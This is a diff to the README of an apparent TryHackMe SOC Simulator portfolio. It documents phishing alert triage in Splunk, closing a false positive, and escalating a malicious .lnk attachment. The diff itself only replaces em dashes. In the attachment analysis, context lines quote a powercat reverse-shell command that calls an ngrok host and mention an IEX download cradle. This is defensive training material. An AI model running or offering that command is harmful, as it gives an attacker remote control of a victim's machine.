@@ -4,11 +4,11 @@
 
 ## Objective
 This project documents hands-on L1 SOC analyst experience completed 
-using TryHackMe's live SOC Simulator — a real-time environment that 
+using TryHackMe's live SOC Simulator - a real-time environment that 
 replicates the full alert triage workflow used in professional Security 
 Operations Centers. Alerts arrive live on a SIEM dashboard at realistic 
 intervals, requiring prioritization, investigation, verdict determination, 
-escalation decisions, and case documentation — exactly as performed by 
+escalation decisions, and case documentation - exactly as performed by 
 a working SOC analyst.
 
 This walkthrough covers a **phishing scenario** worked from initial alert 
@@ -34,12 +34,12 @@ containing a PowerShell reverse shell.
 
 ## Tools & Technologies
 
-- **TryHackMe SOC Simulator** — Live SOC environment with real-time alerts
-- **Splunk Enterprise** — SIEM platform used for log investigation and pivoting
-- **Analyst VM / Sandbox** — Isolated environment for safe attachment analysis
-- **PowerShell** — Used to inspect malicious `.lnk` file contents
-- **MITRE ATT&CK Framework** — Technique identification and mapping
-- **Incident Playbooks** — Structured triage and escalation procedures
+- **TryHackMe SOC Simulator** - Live SOC environment with real-time alerts
+- **Splunk Enterprise** - SIEM platform used for log investigation and pivoting
+- **Analyst VM / Sandbox** - Isolated environment for safe attachment analysis
+- **PowerShell** - Used to inspect malicious `.lnk` file contents
+- **MITRE ATT&CK Framework** - Technique identification and mapping
+- **Incident Playbooks** - Structured triage and escalation procedures
 
 ---
 
@@ -55,7 +55,7 @@ containing a PowerShell reverse shell.
 
 3. INVESTIGATION
    └── Review alert details and raw logs
-   └── Pivot in Splunk — same sender / same recipient / same time window
+   └── Pivot in Splunk - same sender / same recipient / same time window
    └── Open attachments in Analyst VM sandbox if present
    └── Enrich: VirusTotal, threat intel lookups, PowerShell inspection
 
@@ -73,10 +73,10 @@ containing a PowerShell reverse shell.
 
 ## Walkthrough
 
-### Step 1 — Alert Queue Review and Prioritization
+### Step 1 - Alert Queue Review and Prioritization
 
 Alerts arrive in real time on the SOC dashboard. The queue is sorted 
-by severity and worked in order — Critical first, then High, Medium, 
+by severity and worked in order - Critical first, then High, Medium, 
 and Low. Each alert is assigned before investigation begins to reflect 
 real SOC ownership protocols.
 
@@ -93,7 +93,7 @@ no attachment, inbound direction, timestamped 03/03/2025 at 14:42.
 
 ---
 
-### Step 2 — SIEM Investigation in Splunk
+### Step 2 - SIEM Investigation in Splunk
 
 With the alert details in hand, the next step is pivoting into Splunk 
 to search for any related activity associated with the sender domain.
@@ -113,9 +113,9 @@ TLD, but investigation confirmed no malicious activity.
 
 ---
 
-### Step 3 — False Positive Closure with Documented Rationale
+### Step 3 - False Positive Closure with Documented Rationale
 
-The simulator requires written justification for every verdict — 
+The simulator requires written justification for every verdict - 
 matching real SOC documentation standards.
 
 <img width="1507" height="882" alt="418633905-b61d5aac-56e2-4f89-a483-87b55a868ec5" src="https://github.com/user-attachments/assets/0bc061f8-1d5d-43b6-b629-cb5cd9c758cd" />
@@ -141,7 +141,7 @@ The completed incident report documents the full investigation:
 
 ---
 
-### Step 4 — Continued Triage: Malicious Attachment Discovery
+### Step 4 - Continued Triage: Malicious Attachment Discovery
 
 Triage continues through the alert queue as new alerts arrive. 
 A subsequent alert flags an email with an attachment. The 
@@ -172,10 +172,10 @@ powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
   full remote command execution on the victim machine
 
 **Threat assessment:** If executed, this payload enables:
-- **C2** — Full remote control via reverse PowerShell shell
-- **Persistence** — Attacker can deploy additional payloads
-- **Lateral movement** — Compromised host used as pivot point
-- **Data exfiltration** — Direct access to all files and credentials
+- **C2** - Full remote control via reverse PowerShell shell
+- **Persistence** - Attacker can deploy additional payloads
+- **Lateral movement** - Compromised host used as pivot point
+- **Data exfiltration** - Direct access to all files and credentials
 
 **Verdict: True Positive. Escalate to L2 immediately.**
 
@@ -185,8 +185,8 @@ powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
 
 | Alert ID | Type | Verdict | Key Finding |
 |---|---|---|---|
-| 1000 | Suspicious email — external domain | False Positive | Unusual TLD, no malicious activity confirmed in Splunk |
-| Subsequent | Suspicious attachment | True Positive — Escalate | `.lnk` file contains PowerShell reverse shell via powercat |
+| 1000 | Suspicious email - external domain | False Positive | Unusual TLD, no malicious activity confirmed in Splunk |
+| Subsequent | Suspicious attachment | True Positive - Escalate | `.lnk` file contains PowerShell reverse shell via powercat |
 
 ---
 
@@ -195,9 +195,9 @@ powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
 - Completed end-to-end L1 SOC triage workflow including alert 
   prioritization, SIEM investigation, sandbox analysis, verdict 
   determination, and incident documentation
-- Accurately identified a **False Positive** — preventing alert 
+- Accurately identified a **False Positive** - preventing alert 
   fatigue and unnecessary escalation while documenting clear rationale
-- Accurately identified a **True Positive** — recognizing a fileless 
+- Accurately identified a **True Positive** - recognizing a fileless 
   PowerShell payload using `IEX` download cradle and `powercat` reverse 
   shell before execution
 - Demonstrated cross-source investigation: alert queue → Splunk 
